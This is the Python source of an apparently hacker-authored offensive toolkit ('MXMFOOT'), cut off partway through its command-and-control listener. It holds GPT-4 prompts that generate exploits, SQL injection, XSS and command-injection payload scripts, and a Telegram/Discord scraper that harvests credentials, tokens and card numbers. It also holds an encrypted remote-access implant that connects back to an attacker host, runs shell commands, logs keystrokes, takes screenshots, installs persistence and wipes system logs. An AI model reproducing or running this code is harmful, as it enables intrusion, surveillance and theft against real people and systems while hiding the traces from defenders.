#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ███╗   ███╗██╗  ██╗███╗   ███╗███████╗ ██████╗  ██████╗ ████████╗          ║
║   ████╗ ████║╚██╗██╔╝████╗ ████║██╔════╝██╔═══██╗██╔═══██╗╚══██╔══╝          ║
║   ██╔████╔██║ ╚███╔╝ ██╔████╔██║█████╗  ██║   ██║██║   ██║   ██║             ║
║   ██║╚██╔╝██║ ██╔██╗ ██║╚██╔╝██║██╔══╝  ██║   ██║██║   ██║   ██║             ║
║   ██║ ╚═╝ ██║██╔╝ ██╗██║ ╚═╝ ██║██║     ╚██████╔╝╚██████╔╝   ██║             ║
║   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝      ╚═════╝  ╚═════╝    ╚═╝             ║
║                                                                               ║
║   ███████╗ ██████╗  ██████╗ ████████╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗║
║   ██╔════╝██╔═══██╗██╔═══██╗╚══██╔══╝    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║║
║   █████╗  ██║   ██║██║   ██║   ██║       ██║   ██║██║     ██║   ██║██╔████╔██║║
║   ██╔══╝  ██║   ██║██║   ██║   ██║       ██║   ██║██║     ██║   ██║██║╚██╔╝██║║
║   ██║     ╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║║
║   ╚═╝      ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝║
║                                                                               ║
║                    ██████╗ █████╗ ██╗     ██╗███████╗███████╗                ║
║                    ██╔══██╗██╔══██╗██║     ██║██╔════╝██╔════╝                ║
║                    ██████╔╝███████║██║     ██║█████╗  ███████╗                ║
║                    ██╔══██╗██╔══██║██║     ██║██╔══╝  ╚════██║                ║
║                    ██║  ██║██║  ██║███████╗██║██║     ███████║                ║
║                    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝     ╚══════╝                ║
║                                                                               ║
║                    Versión 4.0 - AI Apocalyptic Edition                       ║
║                    Coded by: ElChinoMX | ZeroDay Crew                         ║
║                    "IA + OSINT + Exploit = Dominio Total"                     ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import socket
import subprocess
import threading
import queue
import base64
import hashlib
import logging
import shutil
import secrets
import string
import re
import random
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

# Criptografía
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

# IA y OpenAI
import openai
from openai import OpenAI

# Web y scraping
import requests
from bs4 import BeautifulSoup
import cloudscraper
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# Social Media
import telethon
from telethon import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty
import discord
from discord.ext import commands

# Colores
from colorama import Fore, Style, init
init(autoreset=True)

# Configurar logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIGURACIÓN DE IA
# ============================================================================

class AIEngine:
    """Motor de IA con OpenAI para auto-exploits y análisis"""
    
    def __init__(self, api_key=None):
        self.api_key = api_key or os.getenv('OPENAI_API_KEY')
        self.client = None
        self.model = "gpt-4"  # o "gpt-3.5-turbo" para versión más económica
        
        if self.api_key:
            self.client = OpenAI(api_key=self.api_key)
            print(f"{Fore.GREEN}[+] IA Engine inicializado con OpenAI{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}[!] OpenAI API key no configurada. IA en modo limitado.{Style.RESET_ALL}")
    
    def generate_exploit(self, vulnerability_info, target_context):
        """Genera código de exploit usando IA"""
        if not self.client:
            return self._fallback_exploit_generation(vulnerability_info)
        
        prompt = f"""
        Eres un experto en seguridad ofensiva. Genera un exploit funcional en Python para la siguiente vulnerabilidad:
        
        Vulnerabilidad: {vulnerability_info}
        Contexto del objetivo: {target_context}
        
        Requisitos:
        1. El exploit debe ser funcional y realista
        2. Incluir manejo de errores
        3. Ser ético y solo para pruebas autorizadas
        4. Incluir comentarios explicativos
        
        Genera SOLO el código Python del exploit, sin explicaciones adicionales.
        """
        
        try:
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "Eres un experto en ciberseguridad ofensiva que genera exploits para pruebas de penetración autorizadas."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.7,
                max_tokens=2000
            )
            
            exploit_code = response.choices[0].message.content
            # Extraer código de los bloques de código
            code_match = re.search(r'```python\n(.*?)```', exploit_code, re.DOTALL)
            if code_match:
                exploit_code = code_match.group(1)
            
            return exploit_code
        except Exception as e:
            print(f"[-] Error generando exploit con IA: {e}")
            return self._fallback_exploit_generation(vulnerability_info)
    
    def _fallback_exploit_generation(self, vulnerability_info):
        """Generador de exploits básico (fallback)"""
        vuln_lower = str(vulnerability_info).lower()
        
        if 'sql' in vuln_lower:
            return self._generate_sql_injection_exploit()
        elif 'xss' in vuln_lower:
            return self._generate_xss_exploit()
        elif 'rce' in vuln_lower or 'command' in vuln_lower:
            return self._generate_rce_exploit()
        else:
            return self._generate_generic_exploit()
    
    def _generate_sql_injection_exploit(self):
        return """
import requests
import sys

def sql_injection_exploit(target_url):
    \"\"\"SQL Injection auto-exploit\"\"\"
    
    # Payloads comunes
    payloads = [
        "' OR '1'='1' --",
        "' UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE users; --"
    ]
    
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"{target_url}?id={payload}", timeout=10)
            if "error" not in response.text.lower():
                results.append({
                    'payload': payload,
                    'vulnerable': True,
                    'response_length': len(response.text)
                })
                print(f"[+] SQL vulnerable con: {payload}")
        except:
            pass
    
    return results

if __name__ == "__main__":
    if len(sys.argv) > 1:
        sql_injection_exploit(sys.argv[1])
"""
    
    def _generate_xss_exploit(self):
        return """
import requests
from bs4 import BeautifulSoup

def xss_exploit(target_url):
    \"\"\"XSS auto-exploit\"\"\"
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>"
    ]
    
    vulnerable = []
    for payload in payloads:
        try:
            data = {'input': payload, 'comment': payload}
            response = requests.post(target_url, data=data)
            
            if payload in response.text:
                vulnerable.append(payload)
                print(f"[+] XSS ejecutado con: {payload[:50]}")
        except:
            pass
    
    return vulnerable
"""
    
    def _generate_rce_exploit(self):
        return """
import requests
import subprocess

def rce_exploit(target_url, command='id'):
    \"\"\"RCE auto-exploit\"\"\"
    
    # Payloads para diferentes tecnologías
    payload_templates = [
        "'; {}; #",
        "| {}",
        "|| {}",
        "; {};",
        "$({})",
        "`{}`"
    ]
    
    results = []
    for template in payload_templates:
        payload = template.format(command)
        try:
            response = requests.get(f"{target_url}?cmd={payload}", timeout=10)
            if response.status_code == 200 and len(response.text) > 0:
                results.append({
                    'payload': payload,
                    'output': response.text[:500],
                    'vulnerable': True
                })
                print(f"[+] RCE detectada con: {payload}")
        except:
            pass
    
    return results
"""
    
    def _generate_generic_exploit(self):
        return """
import requests
import sys

def generic_exploit(target_url):
    \"\"\"Exploit genérico para pruebas\"\"\"
    
    try:
        response = requests.get(target_url, timeout=10)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Headers: {dict(response.headers)}")
        return {'status': response.status_code, 'headers': dict(response.headers)}
    except Exception as e:
        return {'error': str(e)}

if __name__ == "__main__":
    if len(sys.argv) > 1:
        generic_exploit(sys.argv[1])
"""
    
    def analyze_vulnerability(self, scan_data):
        """Analiza datos de escaneo con IA para identificar vulnerabilidades"""
        if not self.client:
            return self._basic_vulnerability_analysis(scan_data)
        
        prompt = f"""
        Analiza los siguientes datos de escaneo de seguridad y determina:
        1. Vulnerabilidades potenciales
        2. Severidad (CRITICAL/HIGH/MEDIUM/LOW)
        3. Exploitabilidad
        4. Recomendaciones de mitigación
        
        Datos del escaneo:
        {json.dumps(scan_data, indent=2)[:2000]}
        
        Responde en formato JSON con la siguiente estructura:
        {{
            "vulnerabilities": [
                {{
                    "type": "tipo",
                    "severity": "severidad",
                    "exploitability": "facilidad",
                    "evidence": "evidencia",
                    "recommendation": "recomendación"
                }}
            ],
            "risk_score": 0-100,
            "summary": "resumen ejecutivo"
        }}
        """
        
        try:
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "Eres un analista de vulnerabilidades experto."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.3,
                max_tokens=1500
            )
            
            result = json.loads(response.choices[0].message.content)
            return result
        except:
            return self._basic_vulnerability_analysis(scan_data)
    
    def _basic_vulnerability_analysis(self, scan_data):
        """Análisis básico de vulnerabilidades (fallback)"""
        vulnerabilities = []
        risk_score = 0
        
        # Detección básica de vulnerabilidades comunes
        data_str = str(scan_data).lower()
        
        if 'sql' in data_str or 'mysql' in data_str or 'select' in data_str:
            vulnerabilities.append({
                'type': 'Potential SQL Injection',
                'severity': 'HIGH',
                'exploitability': 'EASY',
                'evidence': 'SQL keywords detected',
                'recommendation': 'Use parameterized queries'
            })
            risk_score += 30
        
        if 'password' in data_str or 'passwd' in data_str:
            vulnerabilities.append({
                'type': 'Sensitive Data Exposure',
                'severity': 'CRITICAL',
                'exploitability': 'EASY',
                'evidence': 'Password fields visible',
                'recommendation': 'Encrypt sensitive data'
            })
            risk_score += 40
        
        if 'admin' in data_str or 'root' in data_str:
            vulnerabilities.append({
                'type': 'Admin Interface Exposure',
                'severity': 'HIGH',
                'exploitability': 'MEDIUM',
                'evidence': 'Admin keywords found',
                'recommendation': 'Restrict admin access'
            })
            risk_score += 20
        
        return {
            'vulnerabilities': vulnerabilities,
            'risk_score': min(risk_score, 100),
            'summary': f'Se encontraron {len(vulnerabilities)} vulnerabilidades potenciales'
        }
    
    def auto_exploit_suggestion(self, target_info):
        """Sugiere estrategias de explotación basadas en IA"""
        if not self.client:
            return self._basic_exploit_suggestion(target_info)
        
        prompt = f"""
        Basado en la siguiente información del objetivo, sugiere las mejores estrategias de explotación:
        
        {json.dumps(target_info, indent=2)[:1500]}
        
        Responde con una lista priorizada de vectores de ataque, incluyendo:
        1. Tipo de ataque
        2. Herramientas recomendadas
        3. Dificultad estimada
        4. Probabilidad de éxito
        """
        
        try:
            response = self.client.chat.completions.create(
                model=self.model,
                messages=[
                    {"role": "system", "content": "Eres un pentester experto que sugiere vectores de ataque."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.5,
                max_tokens=1000
            )
            
            return response.choices[0].message.content
        except:
            return self._basic_exploit_suggestion(target_info)
    
    def _basic_exploit_suggestion(self, target_info):
        """Sugerencias básicas de explotación"""
        suggestions = []
        
        # Puerto 80/443
        if any(p in str(target_info) for p in ['80', '443', '8080']):
            suggestions.append("• Web attack surface: SQLi, XSS, LFI, RFI")
            suggestions.append("• Directory enumeration with gobuster/dirb")
            suggestions.append("• CMS fingerprinting and version exploitation")
        
        # Puerto 22
        if '22' in str(target_info):
            suggestions.append("• SSH brute force with Hydra")
            suggestions.append("• Check for CVE-2018-15473 (user enumeration)")
        
        # Puerto 445
        if '445' in str(target_info):
            suggestions.append("• SMB enumeration with enum4linux")
            suggestions.append("• EternalBlue (MS17-010) if applicable")
        
        # Puerto 3306
        if '3306' in str(target_info):
            suggestions.append("• MySQL default credentials (root:root)")
            suggestions.append("• MySQL UDF exploitation")
        
        return "\n".join(suggestions)

# ============================================================================
# CRAWLER AUTOMATIZADO PARA TELEGRAM/DISCORD
# ============================================================================

class SocialMediaCrawler:
    """Crawler automatizado para Telegram y Discord"""
    
    def __init__(self, telegram_api_id=None, telegram_api_hash=None, discord_token=None):
        self.telegram_api_id = telegram_api_id
        self.telegram_api_hash = telegram_api_hash
        self.discord_token = discord_token
        
        self.telegram_client = None
        self.discord_client = None
        
        self.crawled_data = {
            'telegram': {'channels': [], 'groups': [], 'messages': [], 'users': []},
            'discord': {'servers': [], 'channels': [], 'messages': [], 'users': []}
        }
    
    # ========================================================================
    # TELEGRAM CRAWLER
    # ========================================================================
    
    async def init_telegram(self):
        """Inicializa cliente de Telegram"""
        if not self.telegram_api_id or not self.telegram_api_hash:
            print(f"{Fore.YELLOW}[!] Telegram API credentials no configuradas{Style.RESET_ALL}")
            return False
        
        try:
            self.telegram_client = TelegramClient(
                'mxmfoot_session',
                self.telegram_api_id,
                self.telegram_api_hash
            )
            await self.telegram_client.start()
            print(f"{Fore.GREEN}[+] Telegram client inicializado{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"[-] Error iniciando Telegram: {e}")
            return False
    
    async def search_telegram_channels(self, query, limit=50):
        """Busca canales de Telegram por palabra clave"""
        if not self.telegram_client:
            if not await self.init_telegram():
                return []
        
        print(f"[*] Buscando canales de Telegram: {query}")
        
        channels = []
        try:
            # Buscar canales globalmente
            result = await self.telegram_client(GetDialogsRequest(
                offset_date=None,
                offset_id=0,
                offset_peer=InputPeerEmpty(),
                limit=limit,
                hash=0
            ))
            
            for dialog in result.dialogs:
                if dialog.is_channel or dialog.is_group:
                    channel_info = {
                        'id': dialog.id,
                        'title': dialog.name,
                        'type': 'channel' if dialog.is_channel else 'group',
                        'participants': None,
                        'username': getattr(dialog.entity, 'username', None)
                    }
                    
                    # Si el título o username contiene la query
                    if query.lower() in channel_info['title'].lower() or \
                       (channel_info['username'] and query.lower() in channel_info['username'].lower()):
                        channels.append(channel_info)
        except Exception as e:
            print(f"[-] Error buscando canales: {e}")
        
        return channels
    
    async def crawl_telegram_messages(self, channel_username, limit=100):
        """Extrae mensajes de un canal/grupo de Telegram"""
        if not self.telegram_client:
            return []
        
        print(f"[*] Crawleando mensajes de Telegram: {channel_username}")
        
        messages = []
        try:
            async for message in self.telegram_client.iter_messages(channel_username, limit=limit):
                msg_data = {
                    'id': message.id,
                    'date': message.date.isoformat() if message.date else None,
                    'sender_id': message.sender_id,
                    'text': message.text,
                    'media': message.media is not None
                }
                
                # Extraer información sensible automáticamente
                msg_data['sensitive'] = self.extract_sensitive_info(message.text or '')
                
                messages.append(msg_data)
        except Exception as e:
            print(f"[-] Error crawleando mensajes: {e}")
        
        return messages
    
    async def auto_crawl_telegram(self, keywords, max_channels=20):
        """Crawl automático de Telegram basado en keywords"""
        print(f"{Fore.CYAN}[*] Iniciando auto-crawl de Telegram{Style.RESET_ALL}")
        
        all_data = []
        
        for keyword in keywords:
            channels = await self.search_telegram_channels(keyword, limit=max_channels)
            
            for channel in channels[:5]:  # Limitar a 5 por keyword
                # Obtener username
                if channel['username']:
                    messages = await self.crawl_telegram_messages(channel['username'], limit=50)
                    
                    channel_data = {
                        'keyword': keyword,
                        'channel': channel,
                        'messages': messages,
                        'total_messages': len(messages),
                        'sensitive_found': sum(1 for m in messages if m.get('sensitive'))
                    }
                    
                    all_data.append(channel_data)
                    
                    if channel_data['sensitive_found'] > 0:
                        print(f"{Fore.RED}[!] Info sensible encontrada en {channel['title']}{Style.RESET_ALL}")
        
        self.crawled_data['telegram']['channels'] = all_data
        return all_data
    
    # ========================================================================
    # DISCORD CRAWLER
    # ========================================================================
    
    async def init_discord(self):
        """Inicializa cliente de Discord"""
        if not self.discord_token:
            print(f"{Fore.YELLOW}[!] Discord token no configurado{Style.RESET_ALL}")
            return False
        
        try:
            intents = discord.Intents.default()
            intents.message_content = True
            intents.members = True
            
            self.discord_client = commands.Bot(command_prefix='!', intents=intents)
            
            @self.discord_client.event
            async def on_ready():
                print(f"{Fore.GREEN}[+] Discord client inicializado como {self.discord_client.user}{Style.RESET_ALL}")
            
            await self.discord_client.start(self.discord_token)
            return True
        except Exception as e:
            print(f"[-] Error iniciando Discord: {e}")
            return False
    
    async def search_discord_servers(self, query):
        """Busca servidores de Discord (requiere estar en ellos)"""
        if not self.discord_client:
            if not await self.init_discord():
                return []
        
        print(f"[*] Buscando en servidores de Discord: {query}")
        
        servers_data = []
        
        for guild in self.discord_client.guilds:
            if query.lower() in guild.name.lower():
                server_info = {
                    'id': guild.id,
                    'name': guild.name,
                    'member_count': guild.member_count,
                    'channels': []
                }
                
                # Obtener canales
                for channel in guild.channels:
                    if isinstance(channel, discord.TextChannel):
                        channel_info = {
                            'id': channel.id,
                            'name': channel.name,
                            'topic': channel.topic,
                            'position': channel.position
                        }
                        server_info['channels'].append(channel_info)
                
                servers_data.append(server_info)
        
        return servers_data
    
    async def crawl_discord_messages(self, server_id, channel_id, limit=100):
        """Extrae mensajes de un canal de Discord"""
        if not self.discord_client:
            return []
        
        print(f"[*] Crawleando mensajes de Discord: channel {channel_id}")
        
        messages = []
        try:
            channel = self.discord_client.get_channel(channel_id)
            if channel:
                async for message in channel.history(limit=limit):
                    msg_data = {
                        'id': message.id,
                        'author': str(message.author),
                        'content': message.content,
                        'timestamp': message.created_at.isoformat(),
                        'attachments': len(message.attachments),
                        'embeds': len(message.embeds)
                    }
                    
                    # Extraer información sensible
                    msg_data['sensitive'] = self.extract_sensitive_info(message.content or '')
                    
                    messages.append(msg_data)
        except Exception as e:
            print(f"[-] Error crawleando mensajes Discord: {e}")
        
        return messages
    
    async def auto_crawl_discord(self, keywords, max_servers=20):
        """Crawl automático de Discord basado en keywords"""
        print(f"{Fore.CYAN}[*] Iniciando auto-crawl de Discord{Style.RESET_ALL}")
        
        if not self.discord_client:
            if not await self.init_discord():
                return []
        
        all_data = []
        
        for keyword in keywords:
            servers = await self.search_discord_servers(keyword)
            
            for server in servers[:max_servers]:
                server_data = {
                    'keyword': keyword,
                    'server': server,
                    'channels_data': []
                }
                
                for channel in server['channels'][:5]:  # Limitar a 5 canales por servidor
                    messages = await self.crawl_discord_messages(server['id'], channel['id'], limit=50)
                    
                    channel_data = {
                        'channel': channel,
                        'messages': messages,
                        'total_messages': len(messages),
                        'sensitive_found': sum(1 for m in messages if m.get('sensitive'))
                    }
                    
                    server_data['channels_data'].append(channel_data)
                    
                    if channel_data['sensitive_found'] > 0:
                        print(f"{Fore.RED}[!] Info sensible en Discord: {server['name']}#{channel['name']}{Style.RESET_ALL}")
                
                all_data.append(server_data)
        
        self.crawled_data['discord']['servers'] = all_data
        return all_data
    
    # ========================================================================
    # UTILIDADES
    # ========================================================================
    
    def extract_sensitive_info(self, text):
        """Extrae información sensible de textos"""
        if not text:
            return {}
        
        sensitive = {}
        
        # Patrones de información sensible
        patterns = {
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'api_key': r'[A-Za-z0-9]{32,45}',
            'ip_address': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
            'phone': r'\+\d{1,3}\s?\d{3}\s?\d{3}\s?\d{4}',
            'password': r'password[\s]*[:=][\s]*[\'"]?[^\'"\s]+',
            'token': r'[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,}',
            'hash': r'[a-f0-9]{32,64}',
            'url': r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+',
            'credit_card': r'\b(?:\d[ -]*?){13,16}\b'
        }
        
        for pattern_name, pattern in patterns.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                sensitive[pattern_name] = list(set(matches))[:5]  # Limitar a 5
        
        return sensitive
    
    def get_all_sensitive_data(self):
        """Obtiene todos los datos sensibles encontrados"""
        all_sensitive = {
            'telegram': [],
            'discord': []
        }
        
        # Telegram
        for channel_data in self.crawled_data['telegram']['channels']:
            for message in channel_data.get('messages', []):
                if message.get('sensitive'):
                    all_sensitive['telegram'].append({
                        'source': channel_data['channel']['title'],
                        'message_id': message['id'],
                        'data': message['sensitive']
                    })
        
        # Discord
        for server_data in self.crawled_data['discord']['servers']:
            for channel_data in server_data.get('channels_data', []):
                for message in channel_data.get('messages', []):
                    if message.get('sensitive'):
                        all_sensitive['discord'].append({
                            'source': f"{server_data['server']['name']}#{channel_data['channel']['name']}",
                            'message_id': message['id'],
                            'data': message['sensitive']
                        })
        
        return all_sensitive

# ============================================================================
# C2 CHANNEL (Cifrado con mejoras)
# ============================================================================

class C2Channel:
    """C2 Channel cifrado con IA para comunicación"""
    
    def __init__(self, password=None):
        self.password = password or self.generate_password()
        self.key = self.derive_key(self.password)
        self.cipher = Fernet(self.key)
        self.session_id = self.generate_session_id()
        self.connected_clients = {}
        self.ai_engine = None
        
    def set_ai_engine(self, ai_engine):
        """Configura el motor de IA para decisiones autónomas"""
        self.ai_engine = ai_engine
    
    def generate_password(self):
        """Genera password fuerte"""
        alphabet = string.ascii_letters + string.digits
        return ''.join(secrets.choice(alphabet) for _ in range(32))
    
    def derive_key(self, password):
        """Deriva clave de cifrado desde password"""
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'mxmfoot_salt_2024',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def generate_session_id(self):
        """Genera ID de sesión único"""
        return hashlib.sha256(os.urandom(32)).hexdigest()[:16]
    
    def encrypt(self, data):
        """Cifra datos"""
        if isinstance(data, dict):
            data = json.dumps(data)
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, encrypted_data):
        """Descifra datos"""
        decrypted = self.cipher.decrypt(encrypted_data)
        try:
            return json.loads(decrypted.decode())
        except:
            return decrypted.decode()
    
    def create_ai_payload(self, lhost, lport, target_os='windows'):
        """Crea payload inteligente con IA integrada"""
        
        ai_code = """
class AIClient:
    def __init__(self):
        self.command_history = []
        self.learned_patterns = {}
        
    def analyze_response(self, output):
        # Análisis simple de respuestas
        if 'error' in output.lower():
            return {'action': 'retry', 'delay': 5}
        elif 'success' in output.lower():
            return {'action': 'continue', 'confidence': 0.9}
        else:
            return {'action': 'normal', 'confidence': 0.5}
    
    def learn(self, command, response):
        # Aprendizaje básico
        key = command.split()[0] if command else 'unknown'
        if key not in self.learned_patterns:
            self.learned_patterns[key] = []
        self.learned_patterns[key].append(response[:100])
        
    def suggest_next_command(self):
        # Sugerir próximo comando basado en patrones
        if self.command_history:
            last_cmd = self.command_history[-1]
            if 'ls' in last_cmd or 'dir' in last_cmd:
                return 'cd ..'
            elif 'whoami' in last_cmd:
                return 'systeminfo'
        return 'help'
"""
        
        payload = f"""
import socket
import subprocess
import base64
import json
import threading
import time
import os
import sys
from cryptography.fernet import Fernet

# Configuración C2
C2_HOST = "{lhost}"
C2_PORT = {lport}
KEY = b'{self.key.decode()}'

{ai_code}

class C2Client:
    def __init__(self):
        self.cipher = Fernet(KEY)
        self.session_id = "{self.session_id}"
        self.ai = AIClient()
        self.keylog_data = []
        self.listener = None
        
    def encrypt(self, data):
        return self.cipher.encrypt(json.dumps(data).encode())
    
    def decrypt(self, data):
        return json.loads(self.cipher.decrypt(data).decode())
    
    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            # Aprendizaje IA
            self.ai.learn(command, output)
            return output
        except subprocess.TimeoutExpired:
            return "Command timeout"
        except Exception as e:
            return str(e)
    
    def start_keylogger(self):
        try:
            from pynput import keyboard
            
            def on_press(key):
                try:
                    self.keylog_data.append(key.char if hasattr(key, 'char') else str(key))
                except:
                    pass
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            return "Keylogger started"
        except:
            return "Keylogger failed"
    
    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            data = ''.join(str(k) for k in self.keylog_data)
            self.keylog_data = []
            return data
        return ""
    
    def install_persistence(self):
        try:
            if os.name == 'nt':  # Windows
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
            else:  # Linux/Mac
                rc_file = os.path.expanduser("~/.bashrc")
                with open(rc_file, 'a') as f:
                    f.write(f"\\n{__file__} &\\n")
            return "Persistence installed"
        except Exception as e:
            return f"Persistence failed: {{e}}"
    
    def cleanup_logs(self):
        try:
            if os.name == 'nt':
                os.system('wevtutil cl System 2>nul')
                os.system('wevtutil cl Security 2>nul')
                os.system('wevtutil cl Application 2>nul')
            else:
                os.system('rm -rf /var/log/*.log 2>/dev/null')
                os.system('history -c')
                os.system('rm ~/.bash_history 2>/dev/null')
            return "Logs cleaned"
        except:
            return "Cleanup failed"
    
    def connect(self):
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((C2_HOST, C2_PORT))
                s.send(self.encrypt({{"type": "register", "session": self.session_id}}))
                
                while True:
                    data = s.recv(65536)
                    if not data:
                        break
                    
                    cmd = self.decrypt(data)
                    
                    if cmd['type'] == 'exec':
                        output = self.execute_command(cmd['command'])
                        s.send(self.encrypt({{"type": "result", "output": output}}))
                    
                    elif cmd['type'] == 'ai_exec':
                        # Comando con análisis IA
                        output = self.execute_command(cmd['command'])
                        analysis = self.ai.analyze_response(output)
                        s.send(self.encrypt({{"type": "result", "output": output, "analysis": analysis}}))
                    
                    elif cmd['type'] == 'keylog_start':
                        result = self.start_keylogger()
                        s.send(self.encrypt({{"type": "status", "msg": result}}))
                    
                    elif cmd['type'] == 'keylog_stop':
                        data = self.stop_keylogger()
                        s.send(self.encrypt({{"type": "keylog_data", "data": data}}))
                    
                    elif cmd['type'] == 'persistence':
                        result = self.install_persistence()
                        s.send(self.encrypt({{"type": "status", "msg": result}}))
                    
                    elif cmd['type'] == 'cleanup':
                        result = self.cleanup_logs()
                        s.send(self.encrypt({{"type": "status", "msg": result}}))
                    
                    elif cmd['type'] == 'screenshot':
                        try:
                            import pyautogui
                            screenshot = pyautogui.screenshot()
                            screenshot.save('screenshot.png')
                            with open('screenshot.png', 'rb') as f:
                                img_data = base64.b64encode(f.read()).decode()
                            s.send(self.encrypt({{"type": "screenshot", "data": img_data}}))
                        except:
                            s.send(self.encrypt({{"type": "error", "msg": "Screenshot failed"}}))
                    
                    elif cmd['type'] == 'ai_suggest':
                        suggestion = self.ai.suggest_next_command()
                        s.send(self.encrypt({{"type": "suggestion", "command": suggestion}}))
                    
            except Exception as e:
                time.sleep(10)
                continue
            finally:
                try:
                    s.close()
                except:
                    pass

if __name__ == "__main__":
    client = C2Client()
    client.connect()
"""
        return payload
    
    def start_listener(self, port=4444):
        """Inicia listener C2 con IA"""
        print(f"{Fore.CYAN}[*] Iniciando C2 Listener Inteligente en puerto {port}{Style.RESET_ALL}")
        
        def handle_client(conn, addr):
            print(f"{Fore.GREEN}[+] Conexión C2 establecida desde {addr}{Style.RESET_ALL}")
            
            try:
                # Recibir registro
                data = conn.recv(4096)
                register = self.decrypt(data)
                session = register.get('session')
                print(f"{Fore.BLUE}[*] Sesión registrada: {session}{Style.RESET_ALL}")
                
                self.connected_clients[session] = {
                    'conn': conn,
                    'addr': addr,
                    'last_seen': time.time(),
                    'commands_sent': 0
                }
                
                # Menú interactivo C2 mejorado con IA
                while True:
                    print(f"\n{Fore.RED}┌─[MXMFOOT AI-C2 - {session[:8]}]{Style.RESET_ALL}")
                    print(f"{Fore.RED}│   Clientes activos: {len(self.connected_clients)}{Style.RESET_ALL}")
                    cmd = input(f"{Fore.RED}└──╼ #{Style.RESET_ALL} ").strip()
                    
                    if cmd == 'help':
                        self.show_c2_help()
                    
                    elif cmd == 'list':
                        print(f"\n{Fore.CYAN}Clientes conectados:{Style.RESET_ALL}")
                        for sid, info in self.connected_clients.items():
                            print(f"  • {sid[:8]} - {info['addr']} - {info['commands_sent']} comandos")
                    
                    elif cmd.startswith('select '):
                        target_session = cmd[7:]
                        current_session = target_session
                        print(f"{Fore.GREEN}[+] Sesión seleccionada: {target_session[:8]}{Style.RESET_ALL}")
                    
                    elif cmd.startswith('shell '):
                        command = cmd[6:]
                        conn.send(self.encrypt({'type': 'exec', 'command': command}))
                        result = self.decrypt(conn.recv(65536))
                        print(f"{Fore.WHITE}{result.get('output', '')}{Style.RESET_ALL}")
                        self.connected_clients[session]['commands_sent'] += 1
                    
                    elif cmd == 'ai_shell':
                        print(f"{Fore.MAGENTA}[🤖] Modo IA Shell activado{Style.RESET_ALL}")
                        while True:
                            ai_cmd = input(f"{Fore.MAGENTA}AI⚡ {Style.RESET_ALL}")
                            if ai_cmd == 'exit':
                                break
                            
                            conn.send(self.encrypt({'type': 'ai_exec', 'command': ai_cmd}))
                            result = self.decrypt(conn.recv(65536))
                            print(f"{Fore.WHITE}{result.get('output', '')}{Style.RESET_ALL}")
                            
                            if result.get('analysis'):
                                print(f"{Fore.CYAN}[AI Analysis] {result['analysis']}{Style.RESET_ALL}")
                    
                    elif cmd == 'keylog_start':
                        conn.send(self.encrypt({'type': 'keylog_start'}))
                        response = self.decrypt(conn.recv(1024))
                        print(f"{Fore.GREEN}[+] {response.get('msg', 'Keylogger iniciado')}{Style.RESET_ALL}")
                    
                    elif cmd == 'keylog_stop':
                        conn.send(self.encrypt({'type': 'keylog_stop'}))
                        response = self.decrypt(conn.recv(65536))
                        if response.get('data'):
                            print(f"{Fore.YELLOW}Keylogs capturados:{Style.RESET_ALL}")
                            print(response['data'])
                            filename = f"keylogs_{session}_{int(time.time())}.txt"
                            with open(filename, 'w') as f:
                                f.write(response['data'])
                            print(f"{Fore.GREEN}[+] Guardado en {filename}{Style.RESET_ALL}")
                    
                    elif cmd == 'persistence':
                        conn.send(self.encrypt({'type': 'persistence'}))
